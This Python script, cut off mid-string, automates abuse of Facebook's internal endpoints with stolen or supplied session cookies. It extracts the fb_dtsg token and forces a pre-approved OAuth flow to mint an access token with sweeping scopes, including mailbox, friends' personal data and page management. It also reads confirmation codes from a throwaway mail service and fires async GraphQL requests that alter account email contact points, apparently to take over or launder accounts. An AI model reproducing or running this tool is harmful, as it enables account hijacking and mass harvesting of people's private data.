import requests
import re
import uuid
import urllib.parse
import time
import random
import string
import base64
import threading
import aiohttp
import asyncio
from threading import Thread

def get_data_dtsg(cookies):
    headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    'accept-language': "en-US,en;q=0.9",
    'cache-control': "max-age=0",
    'dpr': "1.5",
    'priority': "u=0, i",
    'sec-ch-prefers-color-scheme': "dark",
    'sec-ch-ua': "\"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Google Chrome\";v=\"140\"",
    'sec-ch-ua-full-version-list': "\"Chromium\";v=\"140.0.7339.208\", \"Not=A?Brand\";v=\"24.0.0.0\", \"Google Chrome\";v=\"140.0.7339.208\"",
    'sec-ch-ua-mobile': "?0",
    'sec-ch-ua-model': "\"\"",
    'sec-ch-ua-platform': "\"Windows\"",
    'sec-ch-ua-platform-version': "\"19.0.0\"",
    'sec-fetch-dest': "document",
    'sec-fetch-mode': "navigate",
    'sec-fetch-site': "same-origin",
    'sec-fetch-user': "?1",
    'upgrade-insecure-requests': "1",
    'viewport-width': "748",
    'Cookie': cookies
    
    }

    response = requests.get("https://www.facebook.com", headers=headers)
    get_fb_dtsg = re.search(r'DTSGInitialData.*?"token":"(.*?)"', response.text)
    if not get_fb_dtsg:
        return False
    fb_dtsg = get_fb_dtsg.group(1)
    return fb_dtsg

def get_token(fb_dtsg,cookies,uid):
    payload = {
        "av": uid,
        "dpr": "1",
        "fb_dtsg": fb_dtsg,
        "fb_api_caller_class": "RelayModern",
        "variables": '{"input":{"client_mutation_id":"4","actor_id":"'
        + uid
        + '","config_enum":"GDP_CONFIRM","device_id":null,"experience_id":"'
        + str(uuid.uuid4())
        + '","extra_params_json":"{\\"app_id\\":\\"350685531728\\",\\"kid_directed_site\\":\\"false\\",\\"logger_id\\":\\"\\\\\\"'
        + str(uuid.uuid4())
        + '\\\\\\"\\",\\"next\\":\\"\\\\\\"confirm\\\\\\"\\",\\"redirect_uri\\":\\"\\\\\\"https:\\\\\\\\\\\\/\\\\\\\\\\\\/www.facebook.com\\\\\\\\\\\\/connect\\\\\\\\\\\\/login_success.html\\\\\\"\\",\\"response_type\\":\\"\\\\\\"token\\\\\\"\\",\\"return_scopes\\":\\"false\\",\\"scope\\":\\"[\\\\\\"user_subscriptions\\\\\\",\\\\\\"user_videos\\\\\\",\\\\\\"user_website\\\\\\",\\\\\\"user_work_history\\\\\\",\\\\\\"friends_about_me\\\\\\",\\\\\\"friends_actions.books\\\\\\",\\\\\\"friends_actions.music\\\\\\",\\\\\\"friends_actions.news\\\\\\",\\\\\\"friends_actions.video\\\\\\",\\\\\\"friends_activities\\\\\\",\\\\\\"friends_birthday\\\\\\",\\\\\\"friends_education_history\\\\\\",\\\\\\"friends_events\\\\\\",\\\\\\"friends_games_activity\\\\\\",\\\\\\"friends_groups\\\\\\",\\\\\\"friends_hometown\\\\\\",\\\\\\"friends_interests\\\\\\",\\\\\\"friends_likes\\\\\\",\\\\\\"friends_location\\\\\\",\\\\\\"friends_notes\\\\\\",\\\\\\"friends_photos\\\\\\",\\\\\\"friends_questions\\\\\\",\\\\\\"friends_relationship_details\\\\\\",\\\\\\"friends_relationships\\\\\\",\\\\\\"friends_religion_politics\\\\\\",\\\\\\"friends_status\\\\\\",\\\\\\"friends_subscriptions\\\\\\",\\\\\\"friends_videos\\\\\\",\\\\\\"friends_website\\\\\\",\\\\\\"friends_work_history\\\\\\",\\\\\\"ads_management\\\\\\",\\\\\\"create_event\\\\\\",\\\\\\"create_note\\\\\\",\\\\\\"export_stream\\\\\\",\\\\\\"friends_online_presence\\\\\\",\\\\\\"manage_friendlists\\\\\\",\\\\\\"manage_notifications\\\\\\",\\\\\\"manage_pages\\\\\\",\\\\\\"photo_upload\\\\\\",\\\\\\"publish_stream\\\\\\",\\\\\\"read_friendlists\\\\\\",\\\\\\"read_insights\\\\\\",\\\\\\"read_mailbox\\\\\\",\\\\\\"read_page_mailboxes\\\\\\",\\\\\\"read_requests\\\\\\",\\\\\\"read_stream\\\\\\",\\\\\\"rsvp_event\\\\\\",\\\\\\"share_item\\\\\\",\\\\\\"sms\\\\\\",\\\\\\"status_update\\\\\\",\\\\\\"user_online_presence\\\\\\",\\\\\\"video_upload\\\\\\",\\\\\\"xmpp_login\\\\\\"]\\",\\"steps\\":\\"{}\\",\\"tp\\":\\"\\\\\\"unspecified\\\\\\"\\",\\"cui_gk\\":\\"\\\\\\"[PASS]:\\\\\\"\\",\\"is_limited_login_shim\\":\\"false\\"}","flow_name":"GDP","flow_step_type":"STANDALONE","outcome":"APPROVED","source":"gdp_delegated","surface":"FACEBOOK_COMET"}}',
        "doc_id": "6494107973937368",
        "locale": "en_US",
        "server_timestamps": "true",
    }
    headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    'accept-language': "en-US,en;q=0.9",
    'cache-control': "max-age=0",
    'dpr': "1.5",
    'priority': "u=0, i",
    'sec-ch-prefers-color-scheme': "dark",
    'sec-ch-ua': "\"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Google Chrome\";v=\"140\"",
    'sec-ch-ua-full-version-list': "\"Chromium\";v=\"140.0.7339.208\", \"Not=A?Brand\";v=\"24.0.0.0\", \"Google Chrome\";v=\"140.0.7339.208\"",
    'sec-ch-ua-mobile': "?0",
    'sec-ch-ua-model': "\"\"",
    'sec-ch-ua-platform': "\"Windows\"",
    'sec-ch-ua-platform-version': "\"19.0.0\"",
    'sec-fetch-dest': "document",
    'sec-fetch-mode': "navigate",
    'sec-fetch-site': "same-origin",
    'sec-fetch-user': "?1",
    'upgrade-insecure-requests': "1",
    'viewport-width': "748",
    'Cookie': cookies
    
    }

    response = requests.post("https://www.facebook.com/api/graphql/", headers=headers, data=payload)

    try:
        response_json = response.json()
        if (
            "data" in response_json
            and "run_post_flow_action" in response_json["data"]
            and "uri" in response_json["data"]["run_post_flow_action"]
        ):
            uri = response_json["data"]["run_post_flow_action"]["uri"]
            parsed_url = urllib.parse.urlparse(uri)
            query_params = urllib.parse.parse_qs(parsed_url.query)

            close_uri = urllib.parse.unquote(query_params.get("close_uri", [""])[0])
            fragment_url = urllib.parse.urlparse(close_uri)

            if fragment_url.fragment:
                fragment_params = urllib.parse.parse_qs(fragment_url.fragment)
                access_token = fragment_params.get("access_token", [None])[0]
                print(f"Get token thành công: {access_token}")
                return access_token
    except:
        print(f"Get token thất bại")
        return ""


def random_chuoi(length=18):
    # Tạo một chuỗi ngẫu nhiên gồm chữ cái thường và số
    characters = string.ascii_lowercase + string.digits  # Chỉ chữ cái thường và số
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string


def get_code_mail(mail):
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        'Accept': "application/json, text/javascript, */*; q=0.01",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=1, i",
        'referer': "https://mailngon.top/",
        'sec-ch-ua': "\"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Google Chrome\";v=\"140\"",
        'sec-ch-ua-mobile': "?0",
        'sec-ch-ua-platform': "\"Windows\"",
        'sec-fetch-dest': "empty",
        'sec-fetch-mode': "cors",
        'sec-fetch-site': "same-origin",
        'x-requested-with': "XMLHttpRequest"
    }

    attempt_count = 0
    while attempt_count < 10:
        response = requests.get(f"https://mailngon.top/checkmail.php?mail={mail}", headers=headers)

        if response.status_code == 200:
            data = response.json()

            # Check if emails are returned
            if data.get("emails"):
                for email in data["emails"]:
                    # Check if the email is from security@facebookmail.com
                    if email["from"] == "security@facebookmail.com":
                        subject = email["subject"]
                        
                        # Use regular expression to extract the 5-digit code from the subject
                        match = re.search(r'\d{5}', subject)
                        if match:
                            code = match.group(0)
                            print(f"Lấy code thành công: {code}")
                            return code
        time.sleep(2)
        attempt_count += 1
    
    print("Không lấy được mã sau 10 lần thử.")
    return None


def step_1(fb_dtsg,cookies,uid):
    # STEP 1 
    payload = {
    'current_step': "registration",
    '__user': uid,
     '__a': "1",
    'fb_dtsg': fb_dtsg,
    }

    headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    'accept-language': "en-US,en;q=0.9",
    'origin': "https://developers.facebook.com",
    'priority': "u=1, i",
    'referer': "https://developers.facebook.com/async/registration/dialog/?src=default",
    'sec-ch-prefers-color-scheme': "dark",
    'sec-ch-ua': "\"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Google Chrome\";v=\"140\"",
    'sec-ch-ua-full-version-list': "\"Chromium\";v=\"140.0.7339.208\", \"Not=A?Brand\";v=\"24.0.0.0\", \"Google Chrome\";v=\"140.0.7339.208\"",
    'sec-ch-ua-mobile': "?0",
    'sec-ch-ua-model': "\"\"",
    'sec-ch-ua-platform': "\"Windows\"",
    'sec-ch-ua-platform-version': "\"19.0.0\"",
    'sec-fetch-dest': "empty",
    'sec-fetch-mode': "cors",
    'sec-fetch-site': "same-origin",
    'Cookie': cookies
    }
    response = requests.post("https://developers.facebook.com/account/step/", data=payload, headers=headers)
    if '"success":true' in response.text:
        return True
    return False

def step_2(mail,fb_dtsg,cookies,uid):
    # STEP 2
        
    url = f"https://developers.facebook.com/developer/profile_email/send_confirmation_email/?email={mail}&referrer=DeveloperRegistrationEmailContactUpdateDialog"

    payload = {
    '__a': "1",
    'dpr': "1.5",
    'fb_dtsg': fb_dtsg,
    '__user': uid
    }

    headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    'accept-language': "en-US,en;q=0.9",
    'origin': "https://developers.facebook.com",
    'priority': "u=1, i",
    'referer': "https://developers.facebook.com/async/registration/dialog/?src=default",
    'sec-ch-prefers-color-scheme': "dark",
    'sec-ch-ua': "\"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Google Chrome\";v=\"140\"",
    'sec-ch-ua-full-version-list': "\"Chromium\";v=\"140.0.7339.208\", \"Not=A?Brand\";v=\"24.0.0.0\", \"Google Chrome\";v=\"140.0.7339.208\"",
    'sec-ch-ua-mobile': "?0",
    'sec-ch-ua-model': "\"\"",
    'sec-ch-ua-platform': "\"Windows\"",
    'sec-ch-ua-platform-version': "\"19.0.0\"",
    'sec-fetch-dest': "empty",
    'sec-fetch-mode': "cors",
    'sec-fetch-site': "same-origin",
    'Cookie': cookies
    }

    response = requests.post(url, data=payload, headers=headers)
    return True


def comfirm_mail(mail_random,code,fb_dtsg,cookies,uid):

    url = "https://www.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.reg.confirmation.async&type=action&__bkv=a0710649de8e6ca13acc88d95d1071fc4dab0694e43c00b19cb41ede918fa894"

    payload = {
    '__user': uid,
    '__a': "1",
    'fb_dtsg': fb_dtsg,
    'params': "{\"params\":\"{\\\"server_params\\\":{\\\"event_request_id\\\":\\\"41e7ae5f-1f3e-4c7e-b4f0-c20e9db9980b\\\",\\\"text_input_id\\\":\\\"81890925200091\\\",\\\"sms_retriever_started_prior_step\\\":0,\\\"wa_timer_id\\\":\\\"wa_retriever\\\",\\\"reg_info\\\":\\\"{\\\\\\\"first_name\\\\\\\":\\\\\\\"Tuy\\\\\\\\u1ec1n\\\\\\\",\\\\\\\"last_name\\\\\\\":\\\\\\\"Thanh\\\\\\\",\\\\\\\"full_name\\\\\\\":\\\\\\\"Thanh Tuy\\\\\\\\u1ec1n\\\\\\\",\\\\\\\"contactpoint\\\\\\\":\\\\\\\""+mail_random+"\\\\\\\",\\\\\\\"ar_contactpoint\\\\\\\":null,\\\\\\\"contactpoint_type\\\\\\\":\\\\\\\"email\\\\\\\",\\\\\\\"is_using_unified_cp\\\\\\\":null,\\\\\\\"unified_cp_screen_variant\\\\\\\":null,\\\\\\\"is_cp_auto_confirmed\\\\\\\":false,\\\\\\\"is_cp_auto_confirmable\\\\\\\":false,\\\\\\\"is_cp_claimed\\\\\\\":false,\\\\\\\"confirmation_code\\\\\\\":null,\\\\\\\"birthday\\\\\\\":null,\\\\\\\"birthday_derived_from_age\\\\\\\":null,\\\\\\\"did_use_age\\\\\\\":null,\\\\\\\"gender\\\\\\\":1,\\\\\\\"use_custom_gender\\\\\\\":false,\\\\\\\"custom_gender\\\\\\\":null,\\\\\\\"encrypted_password\\\\\\\":null,\\\\\\\"username\\\\\\\":null,\\\\\\\"username_prefill\\\\\\\":null,\\\\\\\"fb_conf_source\\\\\\\":null,\\\\\\\"device_id\\\\\\\":null,\\\\\\\"ig4a_qe_device_id\\\\\\\":null,\\\\\\\"family_device_id\\\\\\\":null,\\\\\\\"user_id\\\\\\\":\\\\\\\""+uid+"\\\\\\\",\\\\\\\"safetynet_token\\\\\\\":null,\\\\\\\"skip_slow_rel_check\\\\\\\":false,\\\\\\\"safetynet_response\\\\\\\":null,\\\\\\\"machine_id\\\\\\\":null,\\\\\\\"profile_photo\\\\\\\":\\\\\\\"https:\\\\\\\\/\\\\\\\\/scontent-sin6-3.xx.fbcdn.net\\\\\\\\/v\\\\\\\\/t39.30808-1\\\\\\\\/483616648_1717678555446845_5698355730260814492_n.jpg?stp=dst-jpg_s200x200_tt6&_nc_cat=106&ccb=1-7&_nc_sid=28885b&_nc_eui2=AeGq82lUlzbTHDEC4-O3gcQ2j05jyttfATyPTmPK218BPBGX-w9bzrsJ8R_IIZUeaYkuNIhn6zITIJIanev_3TZ3&_nc_ohc=QBfwweZopucQ7kNvwG7CdK-&_nc_oc=AdlE4Fp-D9ZSLylAynB_Eh--pxTRiV9ANuOe6G9-tq2Ls6wf-oI5b2PqiAwklC2n4cU&_nc_zt=24&_nc_ht=scontent-sin6-3.xx&_nc_gid=wmEjw9TXwXBHGo3Z2j3SRg&oh=00_AfZm1G6X4Xl5ycMY8T9i4vHG7-zjJ4yE3Crrg3bSl7exNA&oe=68DDCC80\\\\\\\",\\\\\\\"profile_photo_id\\\\\\\":null,\\\\\\\"profile_photo_upload_id\\\\\\\":null,\\\\\\\"avatar\\\\\\\":null,\\\\\\\"email_oauth_token_no_contact_perm\\\\\\\":null,\\\\\\\"email_oauth_token\\\\\\\":null,\\\\\\\"email_oauth_tokens\\\\\\\":null,\\\\\\\"should_skip_two_step_conf\\\\\\\":null,\\\\\\\"openid_tokens_for_testing\\\\\\\":null,\\\\\\\"encrypted_msisdn\\\\\\\":null,\\\\\\\"encrypted_msisdn_for_safetynet\\\\\\\":null,\\\\\\\"cached_headers_safetynet_info\\\\\\\":null,\\\\\\\"should_skip_headers_safetynet\\\\\\\":null,\\\\\\\"headers_last_infra_flow_id\\\\\\\":null,\\\\\\\"headers_last_infra_flow_id_safetynet\\\\\\\":null,\\\\\\\"headers_flow_id\\\\\\\":null,\\\\\\\"was_headers_prefill_available\\\\\\\":null,\\\\\\\"sso_enabled\\\\\\\":null,\\\\\\\"existing_accounts\\\\\\\":null,\\\\\\\"used_ig_birthday\\\\\\\":null,\\\\\\\"sync_info\\\\\\\":null,\\\\\\\"create_new_to_app_account\\\\\\\":null,\\\\\\\"skip_session_info\\\\\\\":null,\\\\\\\"ck_error\\\\\\\":null,\\\\\\\"ck_id\\\\\\\":null,\\\\\\\"ck_nonce\\\\\\\":null,\\\\\\\"should_save_password\\\\\\\":null,\\\\\\\"horizon_synced_username\\\\\\\":null,\\\\\\\"fb_access_token\\\\\\\":null,\\\\\\\"horizon_synced_profile_pic\\\\\\\":null,\\\\\\\"is_identity_synced\\\\\\\":false,\\\\\\\"is_msplit_reg\\\\\\\":null,\\\\\\\"is_spectra_reg\\\\\\\":null,\\\\\\\"spectra_reg_token\\\\\\\":null,\\\\\\\"spectra_reg_guardian_id\\\\\\\":null,\\\\\\\"spectra_reg_guardian_logged_in_context\\\\\\\":null,\\\\\\\"user_id_of_msplit_creator\\\\\\\":null,\\\\\\\"msplit_creator_nonce\\\\\\\":null,\\\\\\\"dma_data_combination_consent_given\\\\\\\":null,\\\\\\\"xapp_accounts\\\\\\\":null,\\\\\\\"fb_device_id\\\\\\\":null,\\\\\\\"fb_machine_id\\\\\\\":null,\\\\\\\"ig_device_id\\\\\\\":null,\\\\\\\"ig_machine_id\\\\\\\":null,\\\\\\\"should_skip_nta_upsell\\\\\\\":null,\\\\\\\"big_blue_token\\\\\\\":null,\\\\\\\"skip_sync_step_nta\\\\\\\":null,\\\\\\\"caa_reg_flow_source\\\\\\\":null,\\\\\\\"ig_authorization_token\\\\\\\":null,\\\\\\\"full_sheet_flow\\\\\\\":false,\\\\\\\"crypted_user_id\\\\\\\":null,\\\\\\\"is_caa_perf_enabled\\\\\\\":false,\\\\\\\"is_preform\\\\\\\":true,\\\\\\\"ignore_suma_check\\\\\\\":false,\\\\\\\"dismissed_login_upsell_with_cna\\\\\\\":false,\\\\\\\"ignore_existing_login\\\\\\\":false,\\\\\\\"ignore_existing_login_from_suma\\\\\\\":false,\\\\\\\"ignore_existing_login_after_errors\\\\\\\":false,\\\\\\\"suggested_first_name\\\\\\\":null,\\\\\\\"suggested_last_name\\\\\\\":null,\\\\\\\"suggested_full_name\\\\\\\":null,\\\\\\\"frl_authorization_token\\\\\\\":null,\\\\\\\"post_form_errors\\\\\\\":null,\\\\\\\"skip_step_without_errors\\\\\\\":false,\\\\\\\"existing_account_exact_match_checked\\\\\\\":false,\\\\\\\"existing_account_fuzzy_match_checked\\\\\\\":false,\\\\\\\"email_oauth_exists\\\\\\\":false,\\\\\\\"confirmation_code_send_error\\\\\\\":null,\\\\\\\"is_too_young\\\\\\\":false,\\\\\\\"source_account_type\\\\\\\":null,\\\\\\\"whatsapp_installed_on_client\\\\\\\":false,\\\\\\\"confirmation_medium\\\\\\\":null,\\\\\\\"source_credentials_type\\\\\\\":null,\\\\\\\"source_cuid\\\\\\\":null,\\\\\\\"source_account_reg_info\\\\\\\":null,\\\\\\\"soap_creation_source\\\\\\\":null,\\\\\\\"source_account_type_to_reg_info\\\\\\\":null,\\\\\\\"registration_flow_id\\\\\\\":\\\\\\\"38181147-d1ca-462e-8692-89f2e046f0b1\\\\\\\",\\\\\\\"should_skip_youth_tos\\\\\\\":false,\\\\\\\"is_youth_regulation_flow_complete\\\\\\\":false,\\\\\\\"is_on_cold_start\\\\\\\":false,\\\\\\\"email_prefilled\\\\\\\":false,\\\\\\\"cp_confirmed_by_auto_conf\\\\\\\":false,\\\\\\\"in_sowa_experiment\\\\\\\":false,\\\\\\\"youth_regulation_config\\\\\\\":null,\\\\\\\"conf_allow_back_nav_after_change_cp\\\\\\\":null,\\\\\\\"conf_bouncing_cliff_screen_type\\\\\\\":null,\\\\\\\"conf_show_bouncing_cliff\\\\\\\":null,\\\\\\\"eligible_to_flash_call_in_ig4a\\\\\\\":false,\\\\\\\"flash_call_permissions_status\\\\\\\":null,\\\\\\\"attestation_result\\\\\\\":null,\\\\\\\"request_data_and_challenge_nonce_string\\\\\\\":null,\\\\\\\"confirmed_cp_and_code\\\\\\\":null,\\\\\\\"notification_callback_id\\\\\\\":null,\\\\\\\"reg_suma_state\\\\\\\":0,\\\\\\\"is_msplit_neutral_choice\\\\\\\":false,\\\\\\\"msg_previous_cp\\\\\\\":null,\\\\\\\"ntp_import_source_info\\\\\\\":null,\\\\\\\"youth_consent_decision_time\\\\\\\":null,\\\\\\\"should_show_spi_before_conf\\\\\\\":true,\\\\\\\"google_oauth_account\\\\\\\":null,\\\\\\\"is_reg_request_from_ig_suma\\\\\\\":false,\\\\\\\"device_emails\\\\\\\":null,\\\\\\\"is_toa_reg\\\\\\\":false,\\\\\\\"is_threads_public\\\\\\\":false,\\\\\\\"spc_import_flow\\\\\\\":false,\\\\\\\"caa_play_integrity_attestation_result\\\\\\\":null,\\\\\\\"client_known_key_hash\\\\\\\":null,\\\\\\\"flash_call_provider\\\\\\\":null,\\\\\\\"spc_birthday_input\\\\\\\":false,\\\\\\\"failed_birthday_year_count\\\\\\\":null,\\\\\\\"user_presented_medium_source\\\\\\\":null,\\\\\\\"user_opted_out_of_ntp\\\\\\\":null,\\\\\\\"is_from_registration_reminder\\\\\\\":false,\\\\\\\"show_youth_reg_in_ig_spc\\\\\\\":false,\\\\\\\"fb_suma_combined_landing_candidate_variant\\\\\\\":\\\\\\\"control\\\\\\\",\\\\\\\"fb_suma_is_high_confidence\\\\\\\":null,\\\\\\\"screen_visited\\\\\\\":[\\\\\\\"CAA_REG_CONFIRMATION_SCREEN\\\\\\\"],\\\\\\\"fb_email_login_upsell_skip_suma_post_tos\\\\\\\":false,\\\\\\\"fb_suma_is_from_email_login_upsell\\\\\\\":false,\\\\\\\"fb_suma_is_from_phone_login_upsell\\\\\\\":false,\\\\\\\"fb_suma_login_upsell_skipped_warmup\\\\\\\":false,\\\\\\\"fb_suma_login_upsell_show_list_cell_link\\\\\\\":false,\\\\\\\"should_prefill_cp_in_ar\\\\\\\":null,\\\\\\\"ig_partially_created_account_user_id\\\\\\\":null,\\\\\\\"ig_partially_created_account_nonce\\\\\\\":null,\\\\\\\"ig_partially_created_account_nonce_expiry\\\\\\\":null,\\\\\\\"force_sessionless_nux_experience\\\\\\\":false,\\\\\\\"has_seen_suma_landing_page_pre_conf\\\\\\\":false,\\\\\\\"has_seen_suma_candidate_page_pre_conf\\\\\\\":false,\\\\\\\"suma_on_conf_threshold\\\\\\\":-1,\\\\\\\"is_keyboard_autofocus\\\\\\\":null,\\\\\\\"pp_to_nux_eligible\\\\\\\":false,\\\\\\\"should_show_error_msg\\\\\\\":true,\\\\\\\"welcome_ar_entrypoint\\\\\\\":\\\\\\\"control\\\\\\\",\\\\\\\"th_profile_photo_token\\\\\\\":null,\\\\\\\"attempted_silent_auth_in_fb\\\\\\\":false,\\\\\\\"cp_suma_results_map\\\\\\\":null,\\\\\\\"source_username\\\\\\\":null,\\\\\\\"next_uri\\\\\\\":null,\\\\\\\"should_use_next_uri\\\\\\\":null,\\\\\\\"linking_entry_point\\\\\\\":null,\\\\\\\"fb_encrypted_partial_new_account_properties\\\\\\\":null,\\\\\\\"starter_pack_name\\\\\\\":null,\\\\\\\"starter_pack_creator_user_ids\\\\\\\":null,\\\\\\\"wa_data_bundle\\\\\\\":null}\\\",\\\"flow_info\\\":\\\"{\\\\\\\"flow_name\\\\\\\":\\\\\\\"new_to_family_fb_default\\\\\\\",\\\\\\\"flow_type\\\\\\\":\\\\\\\"ntf\\\\\\\"}\\\",\\\"current_step\\\":10,\\\"INTERNAL__latency_qpl_marker_id\\\":36707139,\\\"INTERNAL__latency_qpl_instance_id\\\":\\\"81890925200134\\\",\\\"device_id\\\":null,\\\"family_device_id\\\":null,\\\"waterfall_id\\\":\\\"ce53936c-0a87-49ba-8083-1af1a5fd6758\\\",\\\"offline_experiment_group\\\":null,\\\"layered_homepage_experiment_group\\\":null,\\\"is_platform_login\\\":0,\\\"is_from_logged_in_switcher\\\":0,\\\"is_from_logged_out\\\":0,\\\"access_flow_version\\\":\\\"F2_FLOW\\\"},\\\"client_input_params\\\":{\\\"cloud_trust_token\\\":null,\\\"block_store_machine_id\\\":\\\"\\\",\\\"code\\\":\\\""+code+"\\\",\\\"fb_ig_device_id\\\":[],\\\"confirmed_cp_and_code\\\":{},\\\"lois_settings\\\":{\\\"lois_token\\\":\\\"\\\"}}}\"}"
    }

    headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    'accept-language': "en-US,en;q=0.9",
    'origin': "https://www.facebook.com",
    'priority': "u=1, i",
    'sec-ch-prefers-color-scheme': "dark",
    'sec-ch-ua': "\"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Google Chrome\";v=\"140\"",
    'sec-ch-ua-full-version-list': "\"Chromium\";v=\"140.0.7339.208\", \"Not=A?Brand\";v=\"24.0.0.0\", \"Google Chrome\";v=\"140.0.7339.208\"",
    'sec-ch-ua-mobile': "?0",
    'sec-ch-ua-model': "\"\"",
    'sec-ch-ua-platform': "\"Windows\"",
    'sec-ch-ua-platform-version': "\"19.0.0\"",
    'sec-fetch-dest': "empty",
    'sec-fetch-mode': "cors",
    'sec-fetch-site': "same-origin",
    'Cookie': cookies
    }

    response = requests.post(url, data=payload, headers=headers)
    if "confirmation_success" in response.text:
        return True
    return False


def xoa_pending(cookies,dtsg,uid,mail):
    payload = {
    'fb_dtsg': dtsg,
    'contact': mail,
    'surface': "cliff",
    '__user': uid,
    '__a': "1",
    }

    headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    'accept-language': "en-US,en;q=0.9",
    'origin': "https://www.facebook.com",
    'priority': "u=1, i",
    'referer': "https://www.facebook.com/confirmemail.php?next=https%3A%2F%2Fwww.facebook.com%2F&rd",
    'sec-ch-prefers-color-scheme': "dark",
    'sec-ch-ua': "\"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Google Chrome\";v=\"140\"",
    'sec-ch-ua-full-version-list': "\"Chromium\";v=\"140.0.7339.208\", \"Not=A?Brand\";v=\"24.0.0.0\", \"Google Chrome\";v=\"140.0.7339.208\"",
    'sec-ch-ua-mobile': "?0",
    'sec-ch-ua-model': "\"\"",
    'sec-ch-ua-platform': "\"Windows\"",
    'sec-ch-ua-platform-version': "\"19.0.0\"",
    'sec-fetch-dest': "empty",
    'sec-fetch-mode': "cors",
    'sec-fetch-site': "same-origin",
    'Cookie': cookies
    }

    response = requests.post("https://www.facebook.com/removecontact/", data=payload, headers=headers)

    print(response.text)


async def send(session, cookies, fb_dtsg, mail_pending, mail_add, uid, token):
    global success
    url = "https://graph.facebook.com/graphql"
    payload_1 = {
        'variables': "{\"input\":{\"action_type\":\""+base64.b64encode(f"NativeSettingNotifOptionServerActionToken;0||{mail_pending}|email_contact_point".encode()).decode()+"\",\"notif_option_set_context\":{\"client_action_types\":[\"SERVER_ACTION\",\"OPEN_SUB_PAGE\",\"OPEN_ACTION_SHEET\",\"OPEN_GROUP_SETTING\",\"OPEN_DEVICE_PUSH_SETTINGS\",\"OPEN_PAGE_SETTING\"],\"supported_display_styles\":[{\"option_display_styles\":[\"BASIC_MENU\",\"PROFILE_IMAGE_OPTION\",\"TEXT_WITH_BUTTON\",\"WASH_TEXTS\"],\"option_set_display_style\":\"SETTING_PAGE_SECTION\"},{\"option_display_styles\":[\"BASIC_MENU\",\"PROFILE_IMAGE_OPTION\",\"TEXT_WITH_BUTTON\",\"WASH_TEXTS\"],\"option_set_display_style\":\"MENU_SECTION_WITH_INDEPENDENT_ROWS\"},{\"option_display_styles\":[\"TOGGLE_ON\",\"TOGGLE_OFF\"],\"option_set_display_style\":\"TOGGLE\"},{\"option_display_styles\":[\"BLUE_CIRCLE_BUTTON\",\"PLAIN_CHECK\",\"SQUARE_RADIO_BUTTON\",\"PROFILE_IMAGE_WITH_CHECK_OPTION\",\"RADIO_BUTTON\"],\"option_set_display_style\":\"SINGLE_SELECTOR\"},{\"option_display_styles\":[\"PLAIN_CHECK\"],\"option_set_display_style\":\"MULTI_SELECTOR\"}]},\"notif_option_set_ids\":[\"bm90aWZfb3B0aW9uX3NldDpbIkVtYWlsQWRkcmVzc01vZGlmaWNhdGlvbk9wdGlvblNldCIsIkNsYXNzT25seU5vdGlmT3B0aW9uU2V0SUQiLCIiXQ==\"],\"source\":\"notif_settings_page\",\"actor_id\":\""+uid+"\",\"client_mutation_id\":\"1\"},\"scale\":1}",
        'doc_id': "9633107586768738"
    }
    payload_2 = {
        'variables': "{\"input\":{\"action_type\":\""+base64.b64encode(f"NativeSettingNotifOptionServerActionToken;0||{mail_add}|email_contact_point".encode()).decode()+"\",\"notif_option_set_context\":{\"client_action_types\":[\"SERVER_ACTION\",\"OPEN_SUB_PAGE\",\"OPEN_ACTION_SHEET\",\"OPEN_GROUP_SETTING\",\"OPEN_DEVICE_PUSH_SETTINGS\",\"OPEN_PAGE_SETTING\"],\"supported_display_styles\":[{\"option_display_styles\":[\"BASIC_MENU\",\"PROFILE_IMAGE_OPTION\",\"TEXT_WITH_BUTTON\",\"WASH_TEXTS\"],\"option_set_display_style\":\"SETTING_PAGE_SECTION\"},{\"option_display_styles\":[\"BASIC_MENU\",\"PROFILE_IMAGE_OPTION\",\"TEXT_WITH_BUTTON\",\"WASH_TEXTS\"],\"option_set_display_style\":\"MENU_SECTION_WITH_INDEPENDENT_ROWS\"},{\"option_display_styles\":[\"TOGGLE_ON\",\"TOGGLE_OFF\"],\"option_set_display_style\":\"TOGGLE\"},{\"option_display_styles\":[\"BLUE_CIRCLE_BUTTON\",\"PLAIN_CHECK\",\"SQUARE_RADIO_BUTTON\",\"PROFILE_IMAGE_WITH_CHECK_OPTION\",\"RADIO_BUTTON\"],\"option_set_display_style\":\"SINGLE_SELECTOR\"},{\"option_display_styles\":[\"PLAIN_CHECK\"],\"option_set_display_style\":\"MULTI_SELECTOR\"}]},\"notif_option_set_ids\":[\"bm90aWZfb3B0aW9uX3NldDpbIkVtYWlsQWRk